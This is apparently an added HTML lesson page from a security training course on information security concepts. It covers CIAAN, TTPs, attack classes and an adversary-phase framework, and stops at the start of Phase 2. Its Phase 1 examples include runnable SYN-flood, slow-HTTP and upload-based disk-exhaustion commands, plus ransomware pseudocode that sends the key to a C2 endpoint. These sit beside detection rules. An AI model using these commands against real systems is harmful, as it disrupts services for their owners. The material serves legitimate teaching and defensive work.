@@ -1,0 +1,2627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Information Security Concepts | ISCSECURITY Master Class Series</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="/css/styles.css?v=2026_PRODUCTION_FINAL" />
+</head>
+
+<body class="page-lesson">
+
+  <div class="site-topbar" role="note" aria-label="Legal notice">
+    <small class="topbar-note">
+      © 2026 ISCSECURITY · Authorization-first training. All testing must be lawful, scoped, and approved in writing.
+    </small>
+    <nav class="topbar-links" aria-label="Topbar links">
+      <a href="https://iscsecurity.org/index">Home</a>
+      <a href="https://iscsecurity.org/content/index">Content</a>
+	  <a href="https://iscsecurity.org/content/1-ethical-hacking">Ethical Hacking</a>
+      <a href="https://iscsecurity.org/contact">Contact</a>
+    </nav>
+  </div>
+
+  <main class="page modules-page" id="main-content">   <!-- No data-ms-content -->
+    <article class="lesson-content overlay" tabindex="0" aria-label="Lesson content: Introduction to Ethical Hacking">
+
+      <p class="breadcrumb">
+        <a href="https://iscsecurity.org/index">Home</a> →
+        <a href="https://iscsecurity.org/content/index">Content</a> →
+        <a href="https://iscsecurity.org/content/1-ethical-hacking">Ethical Hacking</a> →
+  <span aria-current="page">Page 2</span>
+</p>
+
+    <h1>Information Security Concepts</h1>
+	
+<!-- ============================================================ -->
+    <!-- AUTHORIZED USE BANNERS                                        -->
+    <!-- ============================================================ -->
+
+    <div class="reminder-auth">
+      <strong>🚨 AUTHORIZED USE ONLY:</strong>
+      <span>
+        All content in this document is for educational and defensive training purposes only.
+        The adversarial techniques described are derived from real-world tradecraft but
+        are documented exclusively for <strong>defensive analysis, detection engineering,
+        and authorized security testing</strong>. Unauthorized deployment of any technique
+        described may constitute a criminal offense under applicable national and
+        international cybercrime laws. Always obtain <strong>explicit written authorization</strong>
+        from the system owner or authorized legal entity before testing, executing, or
+        simulating any of the techniques outlined in this document.
+      </span>
+    </div>
+
+    <div class="reminder-comp">
+      <strong>🌍 INTERNATIONAL COMPLIANCE NOTICE:</strong>
+      <span>
+        Cybercrime laws vary significantly by jurisdiction. It's your sole responsibility
+        to understand and comply with the laws applicable to your location, the location
+        of any target systems, and your organization's policies. When in doubt,
+        <strong>consult a qualified legal professional</strong> before testing, executing,
+        or simulating any technique described in this document.
+      </span>
+    </div>
+
+<!-- ============================================================ -->
+<!-- EXECUTIVE SUMMARY                                             -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="executive-summary">
+      <h2>1. Executive Summary</h2>
+      <p>
+        <strong>Operational Premise:</strong> This section moves beyond textbook definitions. 
+        Every concept here; CIAAN, TTPs, vulnerabilities, and attack classifications, is a <em>decision point</em> for a real threat actor. 
+        You will understand how to read information security not as a checklist of defensive controls, but as a map of adversary objectives. 
+        What defenders call <em>integrity</em>, attackers view as a target for manipulation. 
+        What defenders call <em>availability</em>, attackers treat as a pressure point for extortion or chaos. 
+        By the end of this section, you will be able to decompose any security principle into its offensive equivalent and predict how an adversary will try to violate it.
+      </p>
+
+      <ul class="learning-objectives">
+        <li><strong>Objective 1:</strong> Internalize the CIAAN model (Confidentiality, Integrity, Availability, Authenticity, Non-repudiation) as the five things an adversary tries to break, bypass, or steal.</li>
+        <li><strong>Objective 2:</strong> Understand TTPs (Tactics, Techniques, and Procedures) as the operational language of threat actors.</li>
+        <li><strong>Objective 3:</strong> Map the phased adversarial methodology (Denial, Change, Steal, Entry, Expand, Stay) to offensive objectives and defensive controls.</li>
+      </ul>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Level progression">
+          <thead>
+            <tr>
+              <th>Level</th>
+              <th>Mindset Shift</th>
+              <th>Key Focus Areas</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Beginner</strong></td>
+              <td>From "what is security?" to "what does an attacker break?"</td>
+              <td>CIAAN, TTPs basics, vulnerability awareness, attack motives</td>
+            </tr>
+            <tr>
+              <td><strong>Intermediate</strong></td>
+              <td>From "patch everything" to "classify the attack, then control the vulnerability"</td>
+              <td>IATF attack classes, TTP-driven detection, InfoWar linkage</td>
+            </tr>
+            <tr>
+              <td><strong>Advanced</strong></td>
+              <td>From "penetration testing" to "adversary emulation and strategic campaign planning"</td>
+              <td>Phased methodology, persistence/evasion as strategy, MITRE mapping, red-to-blue feedback loops</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- 🟢 BEGINNER LEVEL                                             -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="beginner-level">
+      <h2>2. Beginner Level</h2>
+      <p>
+        Foundational concepts for practitioners new to information security. At the beginner level, you are learning to think in terms of <strong>targets and violations</strong>. 
+        You will internalize the CIAAN model (Confidentiality, Integrity, Availability, Authenticity, and Non-repudiation) not as abstract ideals, but as the five things an adversary tries to break, bypass, or steal.
+      </p>
+
+      <h3>Core Concepts</h3>
+
+      <h3>What Is Information Security?</h3>
+      <p>
+        Information security protects information and the systems that use, store, or transmit it from unauthorized access, disclosure, alteration, disruption, or destruction. Information is a critical asset. If sensitive data reaches the wrong hands, an organization can face financial loss, reputation damage, legal exposure, and loss of trust.
+      </p>
+
+      <h3>Elements of Information Security (CIAAN)</h3>
+      <p>
+        A common way to describe information security is the <strong>"CIAAN"</strong> model:
+        <strong>Confidentiality, Integrity, Availability, Authenticity, and Non-repudiation</strong>.
+        These elements help you understand what defenders protect and what adversaries try to break.
+      </p>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="CIAAN elements">
+          <thead>
+            <tr>
+              <th>Element</th>
+              <th>Meaning</th>
+              <th>Example Controls</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Confidentiality</strong></td>
+              <td>Only authorized parties can access the information.</td>
+              <td>Data classification, encryption, access control, secure disposal.</td>
+            </tr>
+            <tr>
+              <td><strong>Integrity</strong></td>
+              <td>Data stays accurate, complete, and protected from unauthorized change.</td>
+              <td>Checksums, hashes, database constraints, versioning, change control.</td>
+            </tr>
+            <tr>
+              <td><strong>Availability</strong></td>
+              <td>Systems and data remain accessible to authorized users when needed.</td>
+              <td>Redundancy, clustering, anti-malware, DDoS protection, backups.</td>
+            </tr>
+            <tr>
+              <td><strong>Authenticity</strong></td>
+              <td>You can prove that a user, system, document, or message is genuine.</td>
+              <td>Strong authentication, biometrics, smart cards, digital certificates.</td>
+            </tr>
+            <tr>
+              <td><strong>Non-repudiation</strong></td>
+              <td>Parties can't later deny actions such as sending, receiving, or approving.</td>
+              <td>Digital signatures, signed logs, auditable transaction records.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Analogy / Context</h3>
+      <p>
+        Think of CIAAN as the five locks on a vault door. Confidentiality ensures only the right people have the key. Integrity ensures the contents haven't been swapped. Availability ensures you can actually open the vault when you need to. Authenticity ensures the key belongs to the person who claims to have it. Non-repudiation ensures that if someone opens the vault, they can't later deny they did it. An attacker wants to pick, bypass, or break as many of these locks as possible.
+      </p>
+
+      <h3>Confidentiality</h3>
+      <p>
+        Confidentiality ensures that only authorized entities can access information. Breaches can come from poor data handling, lost devices, exposed storage, weak permissions, misconfigurations, or hacking attempts.
+      </p>
+      <ul>
+        <li>Use data classification and handling procedures.</li>
+        <li>Encrypt data at rest and in transit.</li>
+        <li>Apply least privilege and secure media disposal.</li>
+      </ul>
+
+      <h3>Integrity</h3>
+      <p>
+        Integrity protects the accuracy and trustworthiness of data and resources. It stops improper or unauthorized changes and helps ensure that information remains fit for its purpose.
+      </p>
+      <ul>
+        <li>Use checksums and hashes to detect tampering.</li>
+        <li>Restrict updates and deletions through role-based access control.</li>
+        <li>Maintain audit logs and change control processes.</li>
+      </ul>
+
+      <h3>Availability</h3>
+      <p>
+        Availability ensures that systems responsible for delivering, storing, and processing information remain accessible when authorized users need them. DoS attacks, ransomware, hardware failures, and poor capacity planning can all target availability.
+      </p>
+      <ul>
+        <li>Use redundant hardware, clustering, and failover systems.</li>
+        <li>Monitor capacity and service health.</li>
+        <li>Maintain DDoS prevention, anti-malware, and tested backup and restore processes.</li>
+      </ul>
+
+      <h3>Authenticity</h3>
+      <p>
+        Authenticity confirms that communications, documents, users, and systems are genuine. It gives you confidence that an identity or message came from the claimed source.
+      </p>
+      <ul>
+        <li>Use multi-factor authentication for users and administrators.</li>
+        <li>Deploy smart cards, hardware tokens, and biometrics where appropriate.</li>
+        <li>Use PKI and digital certificates for systems and services.</li>
+      </ul>
+
+      <h3>Non-repudiation</h3>
+      <p>
+        Non-repudiation gives you proof that a sender sent a message, a recipient received it, or a user approved an action. It matters for accountability, investigations, and dispute resolution.
+      </p>
+      <ul>
+        <li>Use digital signatures on emails, documents, and transactions.</li>
+        <li>Protect logs with secure time-stamping and immutability.</li>
+        <li>Use auditable acceptance flows such as e-signatures and workflow approvals.</li>
+      </ul>
+
+      <h3>Information Security Attacks: Motives, Goals &amp; Objectives</h3>
+      <p>
+        An <strong>attack</strong> is any action performed with the intent to breach an IT system's security by exploiting vulnerabilities. It may try to obtain, edit, remove, destroy, implant, or reveal information without authorization, or cause unexpected behavior in legitimate software or hardware.
+      </p>
+
+      <p><strong>Conceptually, you can think of an attack as:</strong></p>
+      <pre><code><strong>Attack = Motive (Goal) + Method (TTP) + Vulnerability</strong></code></pre>
+
+      <h3>Motives</h3>
+      <p>
+        Attackers act for specific reasons. Understanding those motives helps you prioritize defenses and response plans.
+      </p>
+      <ul>
+        <li>Disrupt business continuity or critical infrastructure.</li>
+        <li>Steal or manipulate information such as intellectual property, customer data, or financial records.</li>
+        <li>Create fear and chaos for ideological, religious, or political reasons.</li>
+        <li>Achieve state or military objectives such as espionage, sabotage, or influence operations.</li>
+        <li>Damage reputation or take revenge against individuals or organizations.</li>
+        <li>Obtain financial gain through fraud, ransomware, or extortion.</li>
+      </ul>
+
+      <h3>Tactics, Techniques &amp; Procedures (TTPs)</h3>
+      <p>
+        Tactics, Techniques, and Procedures (TTPs) describe how real attackers operate. They show the patterns, behaviors, and workflows that define a threat actor's operational fingerprint. Understanding TTPs helps you recognize adversary behavior early, anticipate the next move, and build stronger detection and response strategies.
+      </p>
+      <ul>
+        <li><strong>Tactics:</strong> The high-level objective of an attacker, such as initial access, lateral movement, or exfiltration.</li>
+        <li><strong>Techniques:</strong> The specific methods used to achieve tactical goals, such as phishing, brute force, or exploiting a web vulnerability.</li>
+        <li><strong>Procedures:</strong> The detailed steps threat actors follow during real operations.</li>
+      </ul>
+      <p>
+        In short: <strong>Tactics = why. Techniques = how. Procedures = the step-by-step.</strong> When you understand all three, you can read the adversary's path instead of reacting to isolated alerts.
+      </p>
+
+      <h3>Vulnerabilities (Weak Links in Systems)</h3>
+      <p>
+        A <strong>vulnerability</strong> is a weakness in the design, implementation, configuration, or operation of a system that an attacker can exploit to compromise security. It often acts as the entry point that lets an adversary bypass authentication, authorization, or other controls.
+      </p>
+
+      <h3>Common Reasons Vulnerabilities Exist</h3>
+      <ul>
+        <li><strong>Hardware or software misconfiguration:</strong> Insecure defaults, open management interfaces, unencrypted protocols, and exposed services create security holes.</li>
+        <li><strong>Insecure or poor design:</strong> Networks and applications that lack segmentation, proper authentication, or input validation are easier to compromise and harder to defend.</li>
+        <li><strong>Inherent technology weaknesses:</strong> Legacy systems may not resist modern attacks, even when configured correctly.</li>
+        <li><strong>End-user carelessness:</strong> Weak passwords, credential sharing, unsafe browsing, and social engineering increase attack success.</li>
+        <li><strong>Intentional end-user acts:</strong> Malicious insiders or disgruntled ex-employees can abuse access to leak or sabotage data and systems.</li>
+      </ul>
+    </section>
+
+<!-- ============================================================ -->
+<!-- 🟡 INTERMEDIATE LEVEL                                         -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="intermediate-level">
+      <h2>3. Intermediate Level</h2>
+      <p>
+        At the intermediate level, you begin linking theoretical weaknesses to real attack classes. You will map specific vulnerability categories to attack classifications and learn to classify an attack by its observable behavior before selecting a defensive control.
+      </p>
+
+      <h3>Vulnerability Categories</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Vulnerability categories">
+          <thead>
+            <tr>
+              <th>Category</th>
+              <th>Description</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>TCP/IP Protocol Weaknesses</strong></td>
+              <td>Core protocols such as HTTP, FTP, ICMP, SNMP, and SMTP were not designed with security as the default. They can lack authentication, encryption, and integrity controls, which makes them vulnerable to sniffing, spoofing, replay attacks, and misconfiguration abuse.</td>
+            </tr>
+            <tr>
+              <td><strong>Operating System Vulnerabilities</strong></td>
+              <td>Operating systems may expose weaknesses through outdated kernels, insecure default services, or unpatched components. Missing updates and legacy subsystems often create reliable privilege-escalation paths for attackers.</td>
+            </tr>
+            <tr>
+              <td><strong>Network Device Vulnerabilities</strong></td>
+              <td>Routers, switches, firewalls, and appliances can fail open when misconfigured or poorly maintained. Common risks include weak passwords, outdated firmware, insecure routing protocols, and overly permissive firewall rules.</td>
+            </tr>
+            <tr>
+              <td><strong>User Account Weaknesses</strong></td>
+              <td>User credentials become a liability when transmitted insecurely, reused, or protected by weak passwords. Attackers frequently exploit leaked credentials, phishing, password spraying, and session hijacking.</td>
+            </tr>
+            <tr>
+              <td><strong>System Account Weaknesses</strong></td>
+              <td>Privileged or service accounts with weak passwords, broad permissions, or unnecessary privileges present a high-value target. Their compromise often enables lateral movement or full domain control.</td>
+            </tr>
+            <tr>
+              <td><strong>Internet Service Misconfiguration</strong></td>
+              <td>Misconfigured web and application services create immediate attack surfaces. Examples include risky features, default modules, unnecessary services, or poor IIS, Apache, Nginx, FTP, or terminal service configuration.</td>
+            </tr>
+            <tr>
+              <td><strong>Default Passwords &amp; Settings</strong></td>
+              <td>Many appliances, IoT devices, and admin interfaces ship with default credentials and settings. If unchanged, attackers can gain quick access using well-known manufacturer defaults.</td>
+            </tr>
+            <tr>
+              <td><strong>Network Device Misconfiguration</strong></td>
+              <td>Incorrect ACLs, poor segmentation, exposed management interfaces, insecure VLAN setups, or misapplied route maps can grant unintended access or support lateral movement.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Classification of Attacks (IATF)</h3>
+      <p>
+        According to the Information Assurance Technical Framework (IATF), attacks can be grouped into five categories:
+        <strong>Passive, Active, Close-in, Insider, and Distribution attacks.</strong>
+      </p>
+
+      <h3>Passive Attacks</h3>
+      <p>
+        Passive attacks intercept and monitor traffic without changing it. The attacker does not interact directly with the target system, which makes detection difficult.
+      </p>
+      <ul>
+        <li>Footprinting and OSINT collection.</li>
+        <li>Sniffing and eavesdropping on unencrypted traffic.</li>
+        <li>Network traffic analysis and metadata collection.</li>
+        <li>Decryption of weakly encrypted traffic.</li>
+      </ul>
+
+      <h3>Active Attacks</h3>
+      <p>
+        Active attacks tamper with data in transit, disrupt communication, or directly compromise systems. They send traffic to the target and are usually detectable when monitoring works properly.
+      </p>
+      <ul>
+        <li>DoS and DDoS attacks.</li>
+        <li>Malware deployment, including viruses, worms, ransomware, and trojans.</li>
+        <li>Spoofing, replay attacks, session hijacking, and man-in-the-middle attacks.</li>
+        <li>SQL injection, XSS, directory traversal, and OS or application exploits.</li>
+        <li>Password attacks, privilege escalation, and backdoor installation.</li>
+      </ul>
+
+      <h3>Close-In Attacks</h3>
+      <p>
+        Close-in attacks require physical proximity to the target system or network. The goal is to gather information, modify it, or disrupt access.
+      </p>
+      <ul>
+        <li>Eavesdropping or shoulder surfing to capture credentials.</li>
+        <li>Dumpster diving for discarded sensitive documents or media.</li>
+        <li>Connecting rogue devices to exposed ports or networks.</li>
+      </ul>
+
+      <h3>Insider Attacks</h3>
+      <p>
+        Insider attacks are carried out by trusted individuals with legitimate access to critical assets. They can bypass many perimeter defenses and may be hard to detect.
+      </p>
+      <ul>
+        <li>Theft of physical devices or confidential data.</li>
+        <li>Wiretapping or eavesdropping on internal communications.</li>
+        <li>Planting keyloggers, backdoors, or malware.</li>
+        <li>Abuse of privileged accounts or shared drives.</li>
+      </ul>
+
+      <h3>Distribution Attacks</h3>
+      <p>
+        Distribution attacks occur when hardware or software is tampered with before installation and use. This can happen at the vendor, in the supply chain, or during transit.
+      </p>
+      <ul>
+        <li>Backdoors inserted into firmware or software during manufacture.</li>
+        <li>Malicious code added to installation media or updates in transit.</li>
+        <li>Hardware implants that exfiltrate data or provide covert access.</li>
+      </ul>
+
+      <h3>Information Warfare (InfoWar)</h3>
+      <p>
+        <strong>Information warfare (InfoWar)</strong> uses information and communication technologies (ICT) to gain an advantage over an opponent. It includes offensive and defensive operations that target information, systems, decision-making, and perception.
+      </p>
+
+      <h3>Libicki's Categories of Information Warfare</h3>
+      <p>
+        Dr. Martin C. Libicki is a leading American defense analyst, scholar, and author specializing in cyberwarfare, information technology, and national security. He has authored multiple influential books and foundational monographs on digital conflict, including <em>What Is Information Warfare?</em> (1995), <em>Conquest in Cyberspace</em> (2007), <em>Cyberdeterrence and Cyberwar</em> (2009), and <em>Cyberspace in Peace and War</em> (2016).
+      </p>
+
+      <ul>
+        <li><strong>Command and Control (C2) warfare:</strong> Disrupts, degrades, or takes over an opponent's command and control systems while protecting your own.</li>
+        <li><strong>Intelligence-based warfare:</strong> Uses sensors and data-driven operations to corrupt, deny, or dominate information needed to control the battlespace.</li>
+        <li><strong>Electronic warfare:</strong> Uses radio-electronic and cryptographic techniques to interfere with communications and sensing systems.</li>
+        <li><strong>Psychological warfare:</strong> Uses propaganda, disinformation, and intimidation to demoralize or manipulate adversaries.</li>
+        <li><strong>Hacker warfare:</strong> Targets information systems through malware, exploits, and penetration techniques to steal, disrupt, or manipulate data and services.</li>
+        <li><strong>Economic warfare:</strong> Disrupts or manipulates information flows that support financial and commercial systems.</li>
+        <li><strong>Cyberwarfare:</strong> Includes information terrorism, semantic attacks, and simulated or demonstrative operations.</li>
+      </ul>
+
+      <h3>Offensive vs Defensive Information Warfare</h3>
+      <ul>
+        <li><strong>Defensive InfoWar:</strong> Strategies and actions taken to protect your own Information and Communications Technology (ICT) assets from attack.</li>
+        <li><strong>Offensive InfoWar:</strong> Actions aimed at degrading, disrupting, or exploiting an opponent's Information and Communications Technology (ICT) assets.</li>
+      </ul>
+    </section>
+
+<!-- ============================================================ -->
+<!-- 🔴 ADVANCED / OPERATOR LEVEL                                  -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="advanced-level">
+      <h2>4. Advanced / Operator Level</h2>
+      <p>
+        At the advanced level, you are preparing for <strong>adversary emulation and red team operations</strong>. The phased adversarial 
+		methodology; Denial, Change, Steal, Entry, Expand, and Stay becomes your operational planning framework.
+      </p>
+
+      <h3>Phased Adversarial Methodology: The Adversary's Lens on Information Security</h3>
+      <p>
+        Information security concepts become easier to understand when you view them as things an adversary wants to break, bypass, or use. 
+		The CIAAN model isn't just a definition set. It is a map of targets. Each element represents a defensive goal and an attacker 
+		objective.
+      </p>
+      
+	  <p>
+        Use this method to connect theory to real attack paths. You start with what the adversary wants, then identify which security 
+		principle they are trying to violate.
+      </p>
+
+      <h3>Phase 1: Disruption &amp; Availability (The Denial Vector)</h3>
+      <p><strong>Adversarial goal:</strong> Make the target unusable to force attention, create pressure, or cause chaos.</p>
+      <ul>
+        <li><strong>Core concept:</strong> Availability.</li>
+        <li><strong>DoS/DDoS:</strong> Overwhelm bandwidth, infrastructure, or application resources until services fail.</li>
+        <li><strong>Ransomware:</strong> Encrypt data and deny access until the victim pays or restores from backups.</li>
+        <li><strong>Wiper malware:</strong> Destroy data to create long-term outage and operational damage.</li>
+        <li><strong>Key techniques:</strong> Traffic flooding, resource exhaustion, destructive malware, and data encryption.</li>
+      </ul>
+
+<!-- =========================================== -->
+<!-- PHASE 1                                      -->
+<!-- =========================================== -->
+
+<div class="reminder" style="margin-bottom: 20px; background: #ffebee; border-left: 4px solid #f44336; padding: 16px 20px; border-radius: 4px;">
+  <strong style="color: #b71c1c;">🚨 AUTHORIZED USE &amp; LAB ENVIRONMENT ONLY:</strong>
+  <span style="color: #b71c1c;">
+    The adversarial examples below describe real-world attacker tradecraft for defensive analysis, detection engineering, and authorized purple-team exercises. <strong>Do not execute offensive techniques outside of isolated, sandboxed environments.</strong> Unauthorized deployment is illegal under the CFAA and comparable international cybercrime statutes.
+  </span>
+</div>
+
+<h3>Phase 1: Disruption &amp; Availability (The Deny Vector)</h3>
+<p><strong>Adversarial goal:</strong> Deny access to systems, data, or services to inflict operational or financial damage.</p>
+<ul>
+  <li><strong>Core concept:</strong> Availability.</li>
+  <li><strong>Volumetric attacks:</strong> Exhaust bandwidth, connection tables, or compute resources to render services unreachable.</li>
+  <li><strong>Resource exhaustion:</strong> Abuse application or system features to consume disk, memory, or CPU until failure.</li>
+  <li><strong>Ransomware:</strong> Encrypt files to deny access and weaponize recovery as leverage.</li>
+  <li><strong>Key techniques:</strong> SYN flooding, low-and-slow application-layer attacks, disk-space exhaustion, and cryptographic denial.</li>
+</ul>
+
+<h3>Adversarial Examples: Phase 1 — Disruption &amp; Availability</h3>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Context:</strong> The following examples represent 
+  real-world adversary tradecraft observed in enterprise intrusions. They are 
+  documented here for defensive analysis and detection engineering in authorized 
+  environments only.
+</div>
+
+<h3>Example 1.1: Network Denial-of-Service</h3>
+
+<p><strong>Adversary Objective:</strong> Degrade or eliminate service availability by exhausting network or transport-layer resources.</p>
+
+<p>An adversary leverages volumetric SYN floods to overwhelm a target's TCP connection backlog, causing legitimate handshake requests to drop. To evade volume-based detection, they may alternatively employ low-and-slow attacks—such as Slowloris or RUDY—which open minimal connections and hold them open indefinitely with partial requests.</p>
+
+<pre><code><span style="color:#4CAF50;"># Volumetric SYN flood to exhaust TCP backlog (authorized testing only)</span>
+hping3 -S --flood -p 80 &lt;target&gt;
+
+<span style="color:#4CAF50;"># Low-and-slow application-layer attack to evade threshold detection</span>
+slowhttptest -c 1000 -H -g -o slowhttp_stats -u http://&lt;target&gt;/
+
+<span style="color:#4CAF50;"># Validate service degradation from the attacker's position</span>
+curl -s -o /dev/null -w "%{http_code} %{time_total}\n" http://&lt;target&gt;/</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> DoS attacks target availability by exhausting 
+  finite resources—bandwidth, connections, or application threads. Adversaries 
+  balance volume against stealth, preferring low-and-slow techniques that remain 
+  below alerting thresholds.
+  <strong>Detection opportunities:</strong> Baseline connection rates and alert on 
+  deviations; enable SYN cookies (<code>tcp_syncookies</code>) to mitigate SYN floods; 
+  monitor for incomplete HTTP requests held open beyond normal timeouts; correlate 
+  latency spikes with connection volume anomalies.
+</div>
+
+<h3>Example 1.2: Ransomware Deployment</h3>
+
+<p><strong>Adversary Objective:</strong> Encrypt critical files to deny access and extort payment for restoration.</p>
+
+<p>An adversary deploys a file-encryption payload that traverses target directories, encrypts data in-place or renames files with a controlled extension, drops a ransom note, and exfiltrates the recovery key to attacker-controlled infrastructure. Prior to encryption, they may terminate backup processes and shadow-copy services to complicate recovery. Living-off-the-land binaries (e.g., <code>BitLocker</code>, <code>cipher</code>, or legitimate libraries) are often used to minimize detection.</p>
+
+<pre><code><span style="color:#4CAF50;"># Representative payload logic (PSEUDOCODE — for detection engineering only)</span>
+<span style="color:#4CAF50;"># WARNING: This is not functional code. It illustrates adversary logic.</span>
+
+FUNCTION deploy_ransomware(target_directory):
+    key = generate_encryption_key()
+    cipher = initialize_cipher(key)
+
+    FOR each file IN target_directory (recursive):
+        plaintext = read_file(file)
+        ciphertext = cipher.encrypt(plaintext)
+        write_file(file + ".locked", ciphertext)
+        delete_original(file)
+        <span style="color:#4CAF50;"># Detection opportunity: mass file extension changes in short windows</span>
+
+    <span style="color:#4CAF50;"># Drop ransom note in every affected directory</span>
+    write_note(target_directory, "Files encrypted. Contact: attacker@onion")
+
+    <span style="color:#4CAF50;"># Exfiltrate recovery key to C2 infrastructure</span>
+    http_post(c2_endpoint, {"host": system_hostname, "key": key})
+END FUNCTION</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Ransomware weaponizes availability by 
+  cryptographically denying access to data. Attackers prioritize:
+  <ul>
+    <li><strong>Backup destruction:</strong> Deleting shadow copies and backup catalogs before encryption</li>
+    <li><strong>LOLBins:</strong> Using native encryption tools to avoid binary detection</li>
+    <li><strong>Double extortion:</strong> Threatening data leaks alongside encryption</li>
+    <li><strong>Key exfiltration:</strong> Recovery keys are never stored locally; they are held for ransom</li>
+  </ul>
+  <strong>Detection opportunities:</strong> Monitor for mass file modification events 
+  within short windows; alert on rapid file extension changes; detect termination of 
+  backup/VSS processes; and baseline normal file-write velocity per endpoint.
+</div>
+
+<h3>Example 1.3: Resource Exhaustion</h3>
+
+<p><strong>Adversary Objective:</strong> Consume disk, memory, or CPU to cause cascading service failures.</p>
+
+<p>An adversary abuses application features such as unauthenticated file uploads to fill filesystems and trigger denial-of-service conditions. Unlike volumetric DDoS, this operates within legitimate application logic, making it difficult to distinguish from benign activity. Disk exhaustion can also prevent logging, creating a secondary anti-forensic effect.</p>
+
+<pre><code><span style="color:#4CAF50;"># Generate a large payload</span>
+dd if=/dev/zero of=payload.bin bs=1M count=100
+
+<span style="color:#4CAF50;"># Abuse an unrestricted upload endpoint to exhaust disk space</span>
+for i in $(seq 1 100); do
+  curl -X POST http://&lt;target&gt;/upload -F "file=@payload.bin" -s -o /dev/null
+done
+
+<span style="color:#4CAF50;"># Observe service degradation and disk saturation</span>
+df -h /var/www/uploads
+curl -s -o /dev/null -w "%{http_code}\n" http://&lt;target&gt;/</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Resource exhaustion is a subtle denial-of-service 
+  vector that abuses application trust. Filling disks stops logging, prevents writes, 
+  and can crash services.
+  <strong>Detection opportunities:</strong> Monitor disk utilization thresholds; 
+  enforce upload size limits and directory quotas; alert on abnormal file-creation 
+  velocity; and ensure log rotation with size caps to prevent log-induced exhaustion.
+</div>
+
+<h3>Example 1.4: Blue Team — Defensive Countermeasures</h3>
+
+<p><strong>Objective:</strong> Detect, disrupt, and recover from availability attacks.</p>
+
+<p><strong>Detection Rules &amp; Monitoring</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Linux: Rate-limit inbound TCP connections per source</span>
+iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j DROP
+
+<span style="color:#4CAF50;"># Enable SYN cookies to mitigate SYN flood attacks</span>
+sysctl -w net.ipv4.tcp_syncookies=1
+
+<span style="color:#4CAF50;"># Monitor for disk exhaustion</span>
+df -h | awk '$5 >= 90 {print "ALERT: " $6 " is " $5 " full"}'
+
+<span style="color:#4CAF50;"># Windows: Detect large-scale file modifications (PowerShell)</span>
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4663} |
+    Where-Object { $_.Message -match "\.(doc|xls|pdf).*WriteData" }</code></pre>
+
+<p><strong>Incident Response: Availability Attack</strong></p>
+
+<div class="iscsec-table-responsive">
+  <table class="iscsec-table" aria-label="Availability attack incident response">
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Action</th>
+        <th>Tool / Command</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>1. Detect</strong></td>
+        <td>Identify attack vector, source, and scope of impact</td>
+        <td><code>tcpdump</code>, <code>netstat -an</code>, <code>SIEM</code></td>
+      </tr>
+      <tr>
+        <td><strong>2. Contain</strong></td>
+        <td>Block offending sources and rate-limit traffic</td>
+        <td><code>iptables -A INPUT -s &lt;ip&gt; -j DROP</code>, <code>WAF rules</code></td>
+      </tr>
+      <tr>
+        <td><strong>3. Eradicate</strong></td>
+        <td>Remove malicious payloads and terminate attacker processes</td>
+        <td><code>kill -9 &lt;pid&gt;</code>, <code>delete payloads</code></td>
+      </tr>
+      <tr>
+        <td><strong>4. Recover</strong></td>
+        <td>Restore services from immutable backups</td>
+        <td><code>backup restoration</code>, <code>systemctl restart</code></td>
+      </tr>
+      <tr>
+        <td><strong>5. Learn</strong></td>
+        <td>Harden thresholds and update detection rules</td>
+        <td><code>IPS tuning</code>, <code>patch vulnerabilities</code></td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Disclaimer:</strong> These adversarial examples 
+  are derived from real-world attacker tradecraft and are provided for authorized 
+  security testing, detection engineering, and defensive preparedness only. 
+  Redistribution or execution outside of a lawful, authorized scope is prohibited.
+</div>
+
+<div class="adversary-philosophy" style="background: rgba(244,67,54,0.05); border-left: 4px solid #f44336; padding: 18px 24px; margin: 24px 0; border-radius: 4px;">
+  <p style="margin: 0; font-style: italic; color: #cfd8dc;">
+    <strong>Remember:</strong> "Availability is the quickest path to operational impact. Attackers don’t always need to steal data — sometimes, simply making it 
+	inaccessible is enough to achieve their objective. Defenders must treat availability as a strategic asset, not just a technical 
+	checkbox."
+  </p>
+</div>
+
+<!-- =========================================== -->
+<!-- PHASE 2                                      -->
+<!-- =========================================== -->
+
+<h3>Phase 2: Integrity Violation &amp; Corruption (The Change Vector)</h3>
+<p><strong>Adversarial goal:</strong> Alter data or systems to mislead users, hide activity, or prepare deeper access.</p>
+<ul>
+  <li><strong>Core concept:</strong> Integrity.</li>
+  <li><strong>Data manipulation:</strong> Change financial records, log files, or configuration settings.</li>
+  <li><strong>Supply chain attacks:</strong> Inject malicious code into legitimate software updates before they reach the target.</li>
+  <li><strong>Man-in-the-middle attacks:</strong> Alter data in transit between a client and server.</li>
+  <li><strong>Key techniques:</strong> Log tampering, binary patching, certificate spoofing, and unauthorized configuration change.</li>
+</ul>
+
